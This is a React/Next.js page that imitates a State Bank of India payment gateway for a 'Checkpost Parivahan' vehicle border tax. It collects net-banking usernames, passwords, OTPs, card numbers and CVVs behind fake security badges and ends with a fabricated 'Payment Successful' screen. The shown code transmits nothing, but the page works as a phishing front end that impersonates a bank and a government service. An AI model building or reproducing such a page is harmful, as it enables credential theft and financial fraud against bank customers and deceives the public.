"use client";
import { Suspense, useState, useEffect } from "react";
import { useSearchParams } from "next/navigation";

function makeOrderRef(vehicleNo: string) {
  const ts = Date.now().toString().slice(-8);
  return `CPT${vehicleNo.replace(/\s/g, "").toUpperCase() || "VH"}${ts}`;
}

function formatDate(iso: string) {
  if (!iso) return "—";
  const [y, m, d] = iso.split("-");
  return `${d}-${m}-${y}`;
}

const popularBanks = [
  { id: "sbi",    name: "State Bank of India",  short: "SBI",   color: "#fff", bg: "#1c4f9c" },
  { id: "hdfc",   name: "HDFC Bank",            short: "HDFC",  color: "#fff", bg: "#004c8f" },
  { id: "icici",  name: "ICICI Bank",           short: "ICICI", color: "#fff", bg: "#b5272c" },
  { id: "axis",   name: "Axis Bank",            short: "AXIS",  color: "#fff", bg: "#97144d" },
  { id: "pnb",    name: "Punjab National Bank", short: "PNB",   color: "#fff", bg: "#1a5c1a" },
  { id: "boi",    name: "Bank of India",        short: "BOI",   color: "#fff", bg: "#c0392b" },
  { id: "bob",    name: "Bank of Baroda",       short: "BOB",   color: "#fff", bg: "#e07c00" },
  { id: "canara", name: "Canara Bank",          short: "CNR",   color: "#fff", bg: "#0a5c8a" },
  { id: "kotak",  name: "Kotak Mahindra Bank",  short: "KMB",   color: "#fff", bg: "#e2080a" },
];

const otherBanks = [
  "Allahabad Bank","Andhra Bank","Central Bank of India","Corporation Bank",
  "Dena Bank","Federal Bank","IDBI Bank","Indian Bank","Indian Overseas Bank",
  "IndusInd Bank","Oriental Bank of Commerce","South Indian Bank","Syndicate Bank",
  "UCO Bank","Union Bank of India","United Bank of India","Vijaya Bank","Yes Bank",
];

type Step = "method" | "login" | "success";
type Method = "netbanking" | "upi" | "debitcard" | "creditcard";

function BankLoginScreen({
  bank, amount, onBack, onSuccess,
}: {
  bank: typeof popularBanks[0];
  amount: string;
  onBack: () => void;
  onSuccess: () => void;
}) {
  const [userId,   setUserId]   = useState("");
  const [password, setPassword] = useState("");
  const [showPwd,  setShowPwd]  = useState(false);
  const [loading,  setLoading]  = useState(false);
  const [error,    setError]    = useState("");
  const [otpStep,  setOtpStep]  = useState(false);
  const [otp,      setOtp]      = useState(["","","","","",""]);
  const [otpError, setOtpError] = useState("");

  const handleLogin = () => {
    if (!userId.trim() || !password.trim()) { setError("Please enter your Username and Password."); return; }
    setError(""); setLoading(true);
    setTimeout(() => { setLoading(false); setOtpStep(true); }, 1400);
  };

  const handleOtp = () => {
    const code = otp.join("");
    if (code.length < 6) { setOtpError("Please enter the 6-digit OTP."); return; }
    setOtpError(""); setLoading(true);
    setTimeout(() => { setLoading(false); onSuccess(); }, 1600);
  };

  return (
    <div className="sbi-login-overlay">
      <div className="sbi-login-card">
        <div className="sbi-login-header" style={{ background: bank.bg }}>
          <div className="sbi-login-bank-row">
            <div className="sbi-login-logo-circle"><span>{bank.short}</span></div>
            <div>
              <div className="sbi-login-bank-name">{bank.name}</div>
              <div className="sbi-login-bank-sub">Internet Banking — Secure Payment</div>
            </div>
          </div>
          <div className="sbi-login-ssl"><i className="fa fa-lock"></i> 256-bit SSL</div>
        </div>
        <div className="sbi-login-context">
          <i className="fa fa-info-circle"></i>&nbsp;
          Paying <strong>&#8377;{amount}</strong> to <strong>Checkpost Parivahan — MoRTH, Govt. of India</strong>
        </div>
        <div className="sbi-login-body">
          {!otpStep ? (
            <>
              <div className="sbi-login-title"><i className="fa fa-user-circle"></i> {bank.name} NetBanking</div>
              {error && <div className="sbi-login-error"><i className="fa fa-exclamation-triangle"></i> {error}</div>}
              <div className="sbi-login-field">
                <label className="sbi-login-label">Username / Customer ID</label>
                <div className="sbi-login-input-wrap">
                  <i className="fa fa-user sbi-login-icon"></i>
                  <input type="text" className="sbi-login-input" placeholder="Enter your username"
                    value={userId} onChange={(e) => setUserId(e.target.value)} autoComplete="off" />
                </div>
              </div>
              <div className="sbi-login-field">
                <label className="sbi-login-label">Login Password</label>
                <div className="sbi-login-input-wrap">
                  <i className="fa fa-lock sbi-login-icon"></i>
                  <input type={showPwd ? "text" : "password"} className="sbi-login-input"
                    placeholder="Enter your password" value={password}
                    onChange={(e) => setPassword(e.target.value)} autoComplete="off" />
                  <button className="sbi-pwd-toggle" type="button" onClick={() => setShowPwd(!showPwd)}>
                    <i className={`fa fa-eye${showPwd ? "-slash" : ""}`}></i>
                  </button>
                </div>
              </div>
              <div className="sbi-login-links">
                <a href="#" onClick={(e) => e.preventDefault()}>Forgot Username?</a>
                <a href="#" onClick={(e) => e.preventDefault()}>Forgot Password?</a>
              </div>
              <button className="sbi-login-btn" style={{ background: bank.bg }} type="button"
                onClick={handleLogin} disabled={loading}>
                {loading
                  ? <><i className="fa fa-spinner fa-spin"></i> Verifying...</>
                  : <><i className="fa fa-sign-in"></i> Login &amp; Proceed</>}
              </button>
            </>
          ) : (
            <>
              <div className="sbi-login-title"><i className="fa fa-mobile"></i> OTP Verification</div>
              <div className="sbi-otp-info">
                A 6-digit OTP has been sent to your registered mobile number ending in <strong>&#8226;&#8226;&#8226;&#8226;56</strong>
              </div>
              {otpError && <div className="sbi-login-error"><i className="fa fa-exclamation-triangle"></i> {otpError}</div>}
              <div className="sbi-login-field">
                <label className="sbi-login-label">Enter OTP</label>
                <div className="sbi-otp-boxes">
                  {otp.map((val, i) => (
                    <input key={i} type="text" maxLength={1} className="sbi-otp-box" value={val}
                      onChange={(e) => {
                        const v = e.target.value.replace(/\D/g, "");
                        const next = [...otp]; next[i] = v; setOtp(next);
                        if (v && e.target.nextElementSibling)
                          (e.target.nextElementSibling as HTMLInputElement).focus();
                      }}
                      onKeyDown={(e) => {
                        if (e.key === "Backspace" && !val && e.currentTarget.previousElementSibling)
                          (e.currentTarget.previousElementSibling as HTMLInputElement).focus();
                      }}
                    />
                  ))}
                </div>
              </div>
              <div className="sbi-otp-resend">
                Didn&apos;t receive? <a href="#" onClick={(e) => e.preventDefault()}>Resend OTP</a>
              </div>
              <button className="sbi-login-btn" style={{ background: bank.bg }} type="button"
                onClick={handleOtp} disabled={loading}>
                {loading
                  ? <><i className="fa fa-spinner fa-spin"></i> Verifying...</>
                  : <><i className="fa fa-check-circle"></i> Confirm Payment &#8377;{amount}</>}
              </button>
            </>
          )}
          <button className="sbi-login-back" type="button" onClick={onBack}>
            <i className="fa fa-arrow-left"></i> Cancel &amp; Go Back
          </button>
          <div className="sbi-login-secure-note">
            <i className="fa fa-shield"></i> Secure encrypted connection. Never share your credentials.
          </div>
        </div>
      </div>
    </div>
  );
}

function SuccessScreen({ amount, orderRef, vehicleNo }: { amount: string; orderRef: string; vehicleNo: string }) {
  return (
    <div className="sbi-success-wrap">
      <div className="sbi-success-card">
        <div className="sbi-success-icon"><i className="fa fa-check-circle"></i></div>
        <h2 className="sbi-success-title">Payment Successful!</h2>
        <p className="sbi-success-sub">Your vehicle border tax has been paid successfully.</p>
        <div className="sbi-success-details">
          <div className="sbi-success-row"><span>Transaction ID</span><strong>{orderRef}</strong></div>
          <div className="sbi-success-row"><span>Amount Paid</span><strong className="sbi-success-amount">&#8377;{amount}</strong></div>
          {vehicleNo && <div className="sbi-success-row"><span>Vehicle No.</span><strong>{vehicleNo}</strong></div>}
          <div className="sbi-success-row"><span>Status</span><strong className="sbi-success-status">SUCCESS</strong></div>
        </div>
        <div className="sbi-success-actions">
          <button className="sbi-success-print" type="button" onClick={() => window.print()}>
            <i className="fa fa-print"></i> Print Receipt
          </button>
          <a className="sbi-success-home" href="/en/node/579">
            <i className="fa fa-home"></i> Back to Home
          </a>
        </div>
        <p className="sbi-success-note">A confirmation SMS will be sent to your registered mobile number.</p>
      </div>
    </div>
  );
}

function GatewayHeader({ orderRef }: { orderRef: string }) {
  return (
    <>
      <div className="sbi-header">
        <div className="sbi-header-inner">
          <div className="sbi-logo-wrap">
            <svg width="48" height="48" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
              <rect width="48" height="48" rx="6" fill="#fff"/>
              <text x="24" y="32" textAnchor="middle" fontSize="16" fontWeight="900" fill="#1c4f9c" fontFamily="Arial">SBI</text>
            </svg>
            <div className="sbi-logo-text">
              <div className="sbi-name">BHARAT PAYMENT GATEWAY</div>
              <span className="sbi-tagline">Powered by State Bank of India</span>
            </div>
          </div>
          <div className="sbi-header-right-group">
            <span className="sbi-secure-badge"><i className="fa fa-lock"></i> 256-bit SSL</span>
            <span className="sbi-pci-badge"><i className="fa fa-shield"></i> PCI DSS</span>
          </div>
        </div>
      </div>
      <div className="sbi-subheader">
        <span><i className="fa fa-building-o"></i> Merchant: <strong>Checkpost Parivahan (MoRTH, Govt. of India)</strong></span>
        <span className="sbi-ref"><i className="fa fa-hashtag"></i> Ref: {orderRef || "—"}</span>
      </div>
    </>
  );
}

function GatewayFooter() {
  return (
    <div className="sbi-footer">
      <div className="sbi-footer-secure">
        <span><i className="fa fa-lock"></i> SSL Secured</span>
        <span><i className="fa fa-shield"></i> PCI DSS Compliant</span>
        <span><i className="fa fa-check-circle"></i> RBI Regulated</span>
        <span><i className="fa fa-bank"></i> State Bank of India</span>
      </div>
      <div>&#169; 2026 State Bank of India &amp; NPCI. All rights reserved. &nbsp;|&nbsp; Privacy Policy &nbsp;|&nbsp; Terms of Use</div>
    </div>
  );
}

function SBIContent() {
  const searchParams = useSearchParams();
  const stateCode = searchParams.get("state")     ?? "";
  const vehicleNo = searchParams.get("vehicleNo") ?? "";
  const ownerName = searchParams.get("ownerName") ?? "";
  const chassisNo = searchParams.get("chassisNo") ?? "";
  const taxFrom   = searchParams.get("taxFrom")   ?? "";
  const taxTo     = searchParams.get("taxTo")     ?? "";
  const amount    = searchParams.get("amount")    ?? "0";

  const [clientOrderRef, setClientOrderRef] = useState("");
  useEffect(() => { setClientOrderRef(makeOrderRef(vehicleNo || "VH")); }, []); // eslint-disable-line

  const [method,       setMethod]       = useState<Method>("netbanking");
  const [selectedBank, setSelectedBank] = useState("sbi");
  const [otherBank,    setOtherBank]    = useState("");
  const [upiId,        setUpiId]        = useState("");
  const [upiVerified,  setUpiVerified]  = useState(false);
  const [cardNo,       setCardNo]       = useState("");
  const [cardExpiry,   setCardExpiry]   = useState("");
  const [cardCvv,      setCardCvv]      = useState("");
  const [cardName,     setCardName]     = useState("");
  const [step,         setStep]         = useState<Step>("method");

  const displayAmount = parseFloat(amount || "0").toFixed(2);
  const bankObj = popularBanks.find(b => b.id === selectedBank) ?? popularBanks[0];

  const methodIcons:  Record<Method, string> = { netbanking:"fa-university", upi:"fa-mobile", debitcard:"fa-credit-card", creditcard:"fa-credit-card-alt" };
  const methodLabels: Record<Method, string> = { netbanking:"Net Banking",   upi:"UPI / BHIM", debitcard:"Debit Card",   creditcard:"Credit Card" };

  if (step === "success") {
    return <SuccessScreen amount={displayAmount} orderRef={clientOrderRef} vehicleNo={vehicleNo} />;
  }

  if (step === "login") {
    return (
      <div className="sbi-page">
        <GatewayHeader orderRef={clientOrderRef} />
        <BankLoginScreen bank={bankObj} amount={displayAmount}
          onBack={() => setStep("method")} onSuccess={() => setStep("success")} />
        <GatewayFooter />
      </div>
    );
  }

  return (
    <div className="sbi-page">
      <GatewayHeader orderRef={clientOrderRef} />
      <div className="sbi-body">
        <div className="sbi-summary">
          <div className="sbi-summary-card">
            <div className="sbi-summary-title"><i className="fa fa-file-text-o"></i> Order Summary</div>
            <div className="sbi-summary-body">
              <div className="sbi-merchant-info">
                <div className="sbi-merchant-name">Checkpost Parivahan — MoRTH</div>
                Vehicle Border Tax Collection (Other State)
              </div>
              <div className="sbi-summary-row" style={{marginTop:"12px"}}>
                <span className="sbi-summary-label">Visiting State</span>
                <span className="sbi-summary-value">{stateCode || "—"}</span>
              </div>
              <div className="sbi-summary-row">
                <span className="sbi-summary-label">Vehicle No.</span>
                <span className="sbi-summary-value">{vehicleNo || "—"}</span>
              </div>
              {ownerName && <div className="sbi-summary-row">
                <span className="sbi-summary-label">Owner</span>
                <span className="sbi-summary-value">{ownerName}</span>
              </div>}
              {chassisNo && <div className="sbi-summary-row">
                <span className="sbi-summary-label">Chassis</span>
                <span className="sbi-summary-value">{chassisNo}</span>
              </div>}
              <div className="sbi-summary-row">
                <span className="sbi-summary-label">Tax Period</span>
                <span className="sbi-summary-value">{formatDate(taxFrom)} – {formatDate(taxTo)}</span>
              </div>
              <div className="sbi-amount-row">
                <span className="sbi-amount-label">Total Payable</span>
                <span className="sbi-amount-value"><span className="sbi-currency">&#8377;</span>{displayAmount}</span>
              </div>
            </div>
          </div>
          <div className="sbi-stepper">
            <div className="sbi-step sbi-step-active"><div className="sbi-step-num">1</div><div className="sbi-step-lbl">Method</div></div>
            <div className="sbi-step-line"></div>
            <div className="sbi-step"><div className="sbi-step-num">2</div><div className="sbi-step-lbl">Login</div></div>
            <div className="sbi-step-line"></div>
            <div className="sbi-step"><div className="sbi-step-num">3</div><div className="sbi-step-lbl">OTP</div></div>
            <div className="sbi-step-line"></div>
            <div className="sbi-step"><div className="sbi-step-num">4</div><div className="sbi-step-lbl">Done</div></div>
          </div>
        </div>

        <div className="sbi-payment">
          <div className="sbi-pay-card">
            <div className="sbi-pay-title"><i className="fa fa-credit-card"></i> Choose Payment Method</div>
            <div className="sbi-method-tabs">
              {(["netbanking","upi","debitcard","creditcard"] as Method[]).map((m) => (
                <button key={m} className={`sbi-method-tab${method === m ? " active" : ""}`} onClick={() => setMethod(m)}>
                  <i className={`fa ${methodIcons[m]}`}></i>{methodLabels[m]}
                </button>
              ))}
            </div>
            <div className="sbi-pay-body">
              {method === "netbanking" && (
                <div>
                  <div className="sbi-section-label">Select your Bank</div>
                  <div className="sbi-bank-grid">
                    {popularBanks.map((bank) => (
                      <label key={bank.id} className={`sbi-bank-option${selectedBank === bank.id ? " selected" : ""}`}>
                        <input type="radio" name="bank" value={bank.id} checked={selectedBank === bank.id}
                          onChange={() => { setSelectedBank(bank.id); setOtherBank(""); }} className="sbi-bank-radio" />
                        <div className="sbi-bank-logo-box" style={{ background: bank.bg }}>
                          <span style={{ color: bank.color, fontWeight: 800, fontSize: "12px" }}>{bank.short}</span>
                        </div>
                        <div className="sbi-bank-name">{bank.name}</div>
                        {selectedBank === bank.id && <span className="sbi-bank-check"><i className="fa fa-check-circle"></i></span>}
                      </label>
                    ))}
                  </div>
                  <div className="sbi-other-bank-wrap">
                    <label className="sbi-other-bank-label">Other Banks</label>
                    <select className="sbi-other-bank-select" value={otherBank}
                      onChange={(e) => { setOtherBank(e.target.value); setSelectedBank(e.target.value); }}>
                      <option value="">— Select other bank —</option>
                      {otherBanks.map((b) => <option key={b} value={b}>{b}</option>)}
                    </select>
                  </div>
                </div>
              )}
              {method === "upi" && (
                <div>
                  <div className="sbi-section-label">Pay via UPI</div>
                  <div className="sbi-upi-input-row">
                    <input type="text" className="sbi-upi-input" placeholder="Enter UPI ID (e.g. 9876543210@ybl)"
                      value={upiId} onChange={(e) => { setUpiId(e.target.value); setUpiVerified(false); }} />
                    <button className="sbi-upi-verify-btn" type="button" onClick={() => setUpiVerified(upiId.includes("@"))}>Verify</button>
                  </div>
                  {upiVerified && <div className="sbi-upi-verified"><i className="fa fa-check-circle"></i> UPI ID verified</div>}
                  <div className="sbi-upi-or"><span>or select app</span></div>
                  <div className="sbi-upi-apps">
                    {[
                      { name:"BHIM",       bg:"#0066cc", fg:"#fff", abbr:"&#8383;" },
                      { name:"GPay",       bg:"#4285f4", fg:"#fff", abbr:"G" },
                      { name:"PhonePe",    bg:"#5f259f", fg:"#fff", abbr:"P" },
                      { name:"Paytm",      bg:"#00baf2", fg:"#fff", abbr:"P" },
                      { name:"Amazon Pay", bg:"#ff9900", fg:"#fff", abbr:"A" },
                    ].map((app) => (
                      <div key={app.name} className="sbi-upi-app"
                        onClick={() => { setUpiId(`user@${app.name.toLowerCase().replace(" ","")}`); setUpiVerified(true); }}>
                        <div className="sbi-upi-app-icon" style={{ background: app.bg, color: app.fg }}
                          dangerouslySetInnerHTML={{ __html: app.abbr }} />
                        <span>{app.name}</span>
                      </div>
                    ))}
                  </div>
                </div>
              )}
              {(method === "debitcard" || method === "creditcard") && (
                <div className="sbi-card-wrap">
                  <div className="sbi-section-label">{method === "debitcard" ? "Debit" : "Credit"} Card Details</div>
                  <div className="sbi-card-row">
                    <label className="sbi-card-label">Card Number</label>
                    <input type="text" className="sbi-card-input" placeholder="1234  5678  9012  3456"
                      maxLength={19} value={cardNo}
                      onChange={(e) => { const v=e.target.value.replace(/\D/g,"").slice(0,16); setCardNo(v.replace(/(.{4})/g,"$1 ").trim()); }} />
                  </div>
                  <div className="sbi-card-row">
                    <label className="sbi-card-label">Cardholder Name</label>
                    <input type="text" className="sbi-card-input" placeholder="As printed on card"
                      value={cardName} onChange={(e) => setCardName(e.target.value.toUpperCase())} />
                  </div>
                  <div className="sbi-card-row-half">
                    <div className="sbi-card-row">
                      <label className="sbi-card-label">Expiry (MM/YY)</label>
                      <input type="text" className="sbi-card-input" placeholder="MM/YY" maxLength={5} value={cardExpiry}
                        onChange={(e) => { let v=e.target.value.replace(/\D/g,"").slice(0,4); if(v.length>2) v=v.slice(0,2)+"/"+v.slice(2); setCardExpiry(v); }} />
                    </div>
                    <div className="sbi-card-row">
                      <label className="sbi-card-label">CVV</label>
                      <input type="password" className="sbi-card-input" placeholder="&bull;&bull;&bull;"
                        maxLength={3} value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g,"").slice(0,3))} />
                    </div>
                  </div>
                </div>
              )}
            </div>
            <div className="sbi-pay-now-wrap">
              <button className="sbi-pay-now-btn" type="button" onClick={() => setStep("login")}>
                <i className="fa fa-lock"></i>
                Proceed to Pay &#8377;{displayAmount}
                <i className="fa fa-arrow-right"></i>
              </button>
              <div className="sbi-pay-now-note">
                <i className="fa fa-shield"></i> 256-bit SSL Encrypted &middot; PCI DSS Compliant &middot; RBI Regulated
              </div>
            </div>
          </div>
        </div>
      </div>
      <GatewayFooter />
    </div>
  );
}

export default function SBIPaymentGateway() {
  return (
    <Suspense fallback={
      <div className="cp-loading-center">
        <div className="overlay-spinner cp-loading-spinner"></div>
      </div>
    }>
      <SBIContent />
    </Suspense>
  );
}
